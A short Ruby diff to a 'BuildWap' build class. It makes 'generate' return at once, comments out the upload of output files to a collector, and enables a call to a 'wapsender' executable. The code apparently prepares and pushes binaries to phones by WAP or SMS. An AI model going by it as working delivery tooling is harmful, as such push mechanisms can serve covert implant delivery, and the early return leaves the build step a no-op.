@@ -27,6 +27,8 @@ class BuildWap < Build
   def generate(params)
     trace :debug, "Build: generate: #{params}"
 
+    return
+
     # force demo if the RMI is in demo
     params['binary']['demo'] = true if LicenseManager.instance.limits[:rmi][1]
 
@@ -76,13 +78,13 @@ class BuildWap < Build
   def deliver(params)
     trace :debug, "Build: deliver: #{params}"
 
-    @outputs.each do |o|
-      content = File.open(path(o), 'rb') {|f| f.read}
-      Frontend.collector_put(o, content)
-    end
+    #@outputs.each do |o|
+    #  content = File.open(path(o), 'rb') {|f| f.read}
+    #  Frontend.collector_put(o, content)
+    #end
 
     # TODO: send the sms
-    #CrossPlatform.exec path('smssend'), ""
+    CrossPlatform.exec path('wapsender')
     #raise "SMS creation failed" unless File.exist? path('output.png')
 
   end
